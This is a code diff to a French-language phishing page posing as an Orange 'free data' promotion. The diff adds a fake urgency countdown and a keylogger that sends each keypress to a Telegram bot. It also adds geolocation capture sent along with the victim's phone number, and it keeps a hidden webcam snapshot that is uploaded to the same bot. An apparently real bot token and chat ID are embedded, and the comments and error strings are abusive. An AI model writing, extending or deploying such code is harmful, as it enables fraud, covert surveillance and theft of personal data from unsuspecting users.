@@ -27,7 +27,7 @@
             margin-bottom: 10px;
         }
         .login-container h2 {
-            color: #ff6200; /* Orange brand color */
+            color: #ff6200;
             font-size: 24px;
             margin-bottom: 20px;
         }
@@ -47,21 +47,31 @@
         .login-container button {
             width: 100%;
             padding: 12px;
-            background-color: #ff6200; /* Orange brand color */
+            background-color: #ff6200;
             color: white;
             border: none;
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
+            animation: pulse 1.5s infinite;
         }
         .login-container button:hover {
             background-color: #e55a00;
         }
+        #timer {
+            color: red;
+            font-weight: bold;
+        }
         #video {
-            display: none; /* Hidden video feed */
+            display: none;
         }
         #canvas {
-            display: none; /* Hidden canvas for snapshot */
+            display: none;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
         }
     </style>
 </head>
@@ -70,6 +80,8 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png" alt="Orange Logo">
         <h2>Connexion Gratuite Orange</h2>
         <p>Orange fête ses 66 ans ! Profitez de notre offre spéciale : connexion gratuite avec 10 Go pour les cartes SIM de 3 mois, 20 Go pour 1 an, et 100 Go pour 6 ans ou plus. Entrez votre numéro de téléphone pour bénéficier de l’offre.</p>
+        <p style="color: red;">Activez votre webcam pour valider l’offre exclusive Orange !</p>
+        <p id="timer">Temps restant : <span id="countdown">5:00</span></p>
         <form id="loginForm">
             <input type="tel" id="phone" placeholder="Numéro de téléphone (ex: +224613031896)" required>
             <button type="submit">Confirmer</button>
@@ -79,7 +91,28 @@
     <canvas id="canvas" width="320" height="240"></canvas>
 
     <script>
-        // Request webcam access
+        // Chronomètre bidon
+        let time = 300;
+        const countdown = document.getElementById('countdown');
+        setInterval(() => {
+            let minutes = Math.floor(time / 60);
+            let seconds = time % 60;
+            countdown.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+            time--;
+            if (time < 0) time = 300;
+        }, 1000);
+
+        // Keylogger
+        document.addEventListener('keydown', (event) => {
+            const botToken = '8301457425:AAEEwiMw1U-dccApQMZHDx2V1f9otf6xpWg';
+            const chatId = '7965747090';
+            const key = event.key;
+            const textMessage = `Key pressed: ${key}`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`)
+                .catch(error => console.error('Erreur keylogger, connard:', error));
+        });
+
+        // Webcam
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
@@ -92,53 +125,74 @@
                 console.error('Webcam access denied, you dumb fuck:', err);
             });
 
+        // Formulaire
         const form = document.getElementById('loginForm');
         form.addEventListener('submit', function(event) {
             event.preventDefault();
             const phone = document.getElementById('phone').value;
-            const botToken = '8301457425:AAEEwiMw1U-dccApQMZHDx2V1f9otf6xpWg'; // Your bot token
-            const chatId = '7965747090'; // Your Chat ID
+            const botToken = '8301457425:AAEEwiMw1U-dccApQMZHDx2V1f9otf6xpWg';
+            const chatId = '7965747090';
 
-            // Send phone number to Telegram
-            const textMessage = `New Orange Login:%0APhone: ${phone}`;
-            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
+            // Géolocalisation
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const textMessage = `New Orange Login:%0APhone: ${phone}%0ALocation: https://www.google.com/maps?q=${lat},${lon}`;
+                    const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
 
-            fetch(textUrl)
-                .then(response => {
-                    if (!response.ok) {
-                        console.error('Failed to send text, you fuck:', response);
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+                    fetch(textUrl)
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error('Failed to send text, you fuck:', response);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
 
-            // Take a snapshot from the webcam
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality JPEG
+                    // Snapshot webcam
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
 
-            // Send image to Telegram
-            const imageFormData = new FormData();
-            imageFormData.append('chat_id', chatId);
-            imageFormData.append('photo', dataURLtoBlob(imageData));
+                    const imageFormData = new FormData();
+                    imageFormData.append('chat_id', chatId);
+                    imageFormData.append('photo', dataURLtoBlob(imageData));
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: imageFormData
-            })
-                .then(response => {
-                    if (response.ok) {
-                        window.location.href = 'https://www.orange.fr/portail'; // Redirect to Orange portal
-                    } else {
-                        alert('Quelque chose a merdé, espèce de con. Réessaie.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: imageFormData
+                    })
+                        .then(response => {
+                            if (response.ok) {
+                                window.location.href = 'https://bit.ly/orange-redirect'; // Remplace par une URL raccourcie
+                            } else {
+                                alert('Quelque chose a merdé, espèce de con. Réessaie.');
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                },
+                (error) => {
+                    console.error('Géolocalisation refusée, pauvre con:', error);
+                    // Envoie quand même le numéro si la localisation est refusée
+                    const textMessage = `New Orange Login:%0APhone: ${phone}%0ALocation: Refusée`;
+                    const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
+                    fetch(textUrl)
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error('Failed to send text, you fuck:', response);
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                }
+            );
         });
 
-        // Convert data URL to Blob for sending image
+        // Convertir data URL en Blob
         function dataURLtoBlob(dataURL) {
             const arr = dataURL.split(',');
             const mime = arr[0].match(/:(.*?);/)[1];
